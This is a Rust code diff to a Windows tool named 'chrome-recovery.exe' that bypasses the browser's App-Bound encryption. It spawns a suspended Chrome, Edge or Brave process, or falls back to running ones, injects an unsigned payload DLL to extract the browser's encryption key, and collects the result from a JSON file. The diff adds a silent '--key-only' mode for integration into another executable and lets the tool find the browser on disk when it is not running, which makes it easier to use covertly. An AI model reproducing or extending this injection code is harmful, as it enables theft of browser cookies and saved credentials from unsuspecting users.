@@ -8,10 +8,14 @@
 //!   chrome-recovery.exe chrome             # target Chrome
 //!   chrome-recovery.exe edge               # target Edge
 //!   chrome-recovery.exe brave              # target Brave
+//!   chrome-recovery.exe chrome --key-only  # quiet mode (for vvs.exe integration)
 
 #![windows_subsystem = "console"]
 
 use std::{env, mem, os::windows::ffi::OsStrExt, ffi::OsStr, path::PathBuf, thread, time::Duration};
+
+use winreg::enums::HKEY_LOCAL_MACHINE;
+use winreg::RegKey;
 
 use windows::{
     Win32::{
@@ -104,6 +108,71 @@ fn get_process_exe_path(pid: u32) -> Option<String> {
         ok.ok()?;
         Some(String::from_utf16_lossy(&buf[..size as usize]))
     }
+}
+
+fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
+    let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{exe_name}");
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+    if let Ok(key) = hklm.open_subkey(&key_path) {
+        if let Ok(path) = key.get_value::<String, _>("") {
+            let p = PathBuf::from(path);
+            if p.exists() {
+                return Some(p);
+            }
+        }
+    }
+    None
+}
+
+fn find_browser_exe_on_disk(target_exe: &str) -> Option<String> {
+    let pf = env::var("ProgramFiles").unwrap_or_default();
+    let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
+    let local = env::var("LOCALAPPDATA").unwrap_or_default();
+
+    let mut candidates: Vec<PathBuf> = Vec::new();
+    if let Some(p) = get_browser_exe_from_registry(target_exe) {
+        candidates.push(p);
+    }
+
+    match target_exe {
+        "chrome.exe" => {
+            candidates.push(PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"));
+            candidates.push(PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"));
+            candidates.push(PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"));
+        }
+        "msedge.exe" => {
+            candidates.push(PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"));
+            candidates.push(PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"));
+        }
+        "brave.exe" => {
+            candidates.push(PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
+            candidates.push(PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
+            candidates.push(PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
+        }
+        _ => {}
+    }
+
+    for path in candidates {
+        if path.exists() {
+            return Some(path.to_string_lossy().into_owned());
+        }
+    }
+    None
+}
+
+fn resolve_browser_exe(target_exe: &str, key_only: bool) -> Option<String> {
+    let existing_pids = find_browser_pids(target_exe);
+    if let Some(path) = existing_pids
+        .iter()
+        .find_map(|&pid| get_process_exe_path(pid))
+    {
+        return Some(path);
+    }
+    if !key_only {
+        eprintln!("[!] {target_exe} not running. Start it first.");
+        std::process::exit(1);
+    }
+    find_browser_exe_on_disk(target_exe)
 }
 
 /// Spawn a fresh suspended Chrome process, inject the DLL before any mitigation
@@ -248,17 +317,21 @@ fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
 
 fn main() {
     let args: Vec<String> = env::args().collect();
+    let key_only = args.iter().any(|a| a == "--key-only");
+    let positional: Vec<&String> = args.iter().skip(1).filter(|a| !a.starts_with('-')).collect();
 
-    // DLL path: second arg or same dir as exe.
-    let dll_path = if args.len() > 2 {
-        PathBuf::from(&args[2])
+    // DLL path: third positional arg or same dir as exe.
+    let dll_path = if positional.len() > 1 {
+        PathBuf::from(positional[1])
     } else {
         env::current_exe().unwrap().parent().unwrap().join("chrome_payload.dll")
     };
 
     if !dll_path.exists() {
         eprintln!("[!] Payload DLL not found: {}", dll_path.display());
-        eprintln!("    Build it first: cargo build --release -p chrome-payload");
+        if !key_only {
+            eprintln!("    Build it first: cargo build --release -p chrome-payload");
+        }
         std::process::exit(1);
     }
 
@@ -268,7 +341,7 @@ fn main() {
         .into_owned();
 
     // Choose target browser.
-    let filter = args.get(1).map(|s| s.to_lowercase());
+    let filter = positional.first().map(|s| s.to_lowercase());
 
     let target = BROWSERS.iter().find(|b| {
         match &filter {
@@ -281,84 +354,116 @@ fn main() {
         Some(t) => t,
         None => {
             eprintln!("[!] Unknown browser filter '{}'", filter.unwrap_or_default());
-            eprintln!("    Available: chrome, beta, brave, edge");
+            if !key_only {
+                eprintln!("    Available: chrome, beta, brave, edge");
+            }
             std::process::exit(1);
         }
     };
 
-    println!("╔══════════════════════════════════════════════════╗");
-    println!("║  Chrome Recovery v1.0 — Rust / App-Bound Bypass  ║");
-    println!("╚══════════════════════════════════════════════════╝");
-    println!();
-    println!("[*] Target     : {}", target.name);
-    println!("[*] Payload    : {dll_abs}");
-    println!();
+    if !key_only {
+        println!("╔══════════════════════════════════════════════════╗");
+        println!("║  Chrome Recovery v1.0 — Rust / App-Bound Bypass  ║");
+        println!("╚══════════════════════════════════════════════════╝");
+        println!();
+        println!("[*] Target     : {}", target.name);
+        println!("[*] Payload    : {dll_abs}");
+        println!();
+    }
 
     // Clean up stale results from both possible paths.
     let result_path  = env::temp_dir().join("chrome_recovery_result.json");
-    let result_path2 = std::path::PathBuf::from(r"C:\Users\Public\chrome_recovery_result.json");
+    let result_path2 = PathBuf::from(r"C:\Users\Public\chrome_recovery_result.json");
     let _ = std::fs::remove_file(&result_path);
     let _ = std::fs::remove_file(&result_path2);
 
-    // Find a running instance to get the real chrome.exe path.
-    let existing_pids = find_browser_pids(target.exe);
-    if existing_pids.is_empty() {
-        eprintln!("[!] {} not running. Start it first.", target.name);
-        std::process::exit(1);
-    }
-    let chrome_exe = existing_pids.iter()
-        .find_map(|&pid| get_process_exe_path(pid))
-        .unwrap_or_else(|| target.exe.to_string());
+    let chrome_exe = match resolve_browser_exe(target.exe, key_only) {
+        Some(p) => p,
+        None => {
+            eprintln!("[!] Could not locate {} on disk.", target.exe);
+            std::process::exit(1);
+        }
+    };
 
-    println!("[*] chrome.exe : {chrome_exe}");
+    if !key_only {
+        println!("[*] chrome.exe : {chrome_exe}");
+    }
 
     // ── Strategy 1: spawn a fresh suspended Chrome and inject before mitigations ──
     // A newly-created suspended process has not yet called SetProcessMitigationPolicy,
     // so LoadLibraryW accepts unsigned DLLs.
     let mut spawned_pid: Option<u32> = None;
 
-    print!("[*] Spawning suspended Chrome for injection... ");
-    let _ = std::io::Write::flush(&mut std::io::stdout());
+    if !key_only {
+        print!("[*] Spawning suspended Chrome for injection... ");
+        let _ = std::io::Write::flush(&mut std::io::stdout());
+    }
     match spawn_suspended_and_inject(&chrome_exe, &dll_abs) {
         Ok(pid) => {
-            println!("OK (PID {pid})");
+            if !key_only {
+                println!("OK (PID {pid})");
+            }
             spawned_pid = Some(pid);
         }
         Err(e) => {
-            println!("FAIL ({e})");
+            if !key_only {
+                println!("FAIL ({e})");
+            }
         }
     }
 
     // ── Strategy 2: fallback — try all existing Chrome processes ──────────────
     if spawned_pid.is_none() {
-        println!("[*] Falling back to existing process scan...");
-        let mut candidates: Vec<u32> = existing_pids;
+        if !key_only {
+            println!("[*] Falling back to existing process scan...");
+        }
+        let mut candidates: Vec<u32> = find_browser_pids(target.exe);
         candidates.sort();
         let mut injected = false;
         for pid in &candidates {
-            print!("[*]   PID {pid}... ");
-            let _ = std::io::Write::flush(&mut std::io::stdout());
+            if !key_only {
+                print!("[*]   PID {pid}... ");
+                let _ = std::io::Write::flush(&mut std::io::stdout());
+            }
             match inject_dll(*pid, &dll_abs) {
-                Ok(()) => { println!("OK"); injected = true; break; }
-                Err(e)  => println!("skip ({e})"),
+                Ok(()) => {
+                    if !key_only {
+                        println!("OK");
+                    }
+                    injected = true;
+                    break;
+                }
+                Err(e) => {
+                    if !key_only {
+                        println!("skip ({e})");
+                    }
+                }
             }
         }
         if !injected {
             eprintln!("[!] All injection attempts failed.");
-            eprintln!("    Chrome enforces strict DLL-signature policy on all process types.");
+            if !key_only {
+                eprintln!("    Chrome enforces strict DLL-signature policy on all process types.");
+            }
             std::process::exit(1);
         }
     }
 
     // Wait for payload (4s startup delay + COM retries).
-    print!("[*] Waiting for payload");
+    if !key_only {
+        print!("[*] Waiting for payload");
+    }
     for _ in 0..45 {
-        print!(".");
-        let _ = std::io::Write::flush(&mut std::io::stdout());
+        if !key_only {
+            print!(".");
+            let _ = std::io::Write::flush(&mut std::io::stdout());
+        }
         thread::sleep(Duration::from_secs(1));
         if result_path.exists() || result_path2.exists() { break; }
     }
-    println!();
+    if !key_only {
+        println!();
+    }
 
     // Kill the headless Chrome we spawned (if any).
     if let Some(pid) = spawned_pid {
@@ -374,16 +479,29 @@ fn main() {
     let found = if result_path.exists() { &result_path } else { &result_path2 };
     if !found.exists() {
         eprintln!("[!] Timeout: no result from payload.");
-        eprintln!("    Check C:\\Users\\Public\\cr_debug.log for diagnostics.");
+        if !key_only {
+            eprintln!("    Check C:\\Users\\Public\\cr_debug.log for diagnostics.");
+        }
         std::process::exit(1);
     }
 
     let json_raw = std::fs::read_to_string(found).unwrap_or_default();
     match serde_json::from_str::<serde_json::Value>(&json_raw) {
-        Ok(v) => print_results(&v),
+        Ok(v) => {
+            if key_only {
+                if v.get("error").and_then(|e| e.as_str()).is_some() {
+                    std::process::exit(1);
+                }
+            } else {
+                print_results(&v);
+            }
+        }
         Err(e) => {
             eprintln!("[!] JSON parse error: {e}");
-            eprintln!("{json_raw}");
+            if !key_only {
+                eprintln!("{json_raw}");
+            }
+            std::process::exit(1);
         }
     }
 }
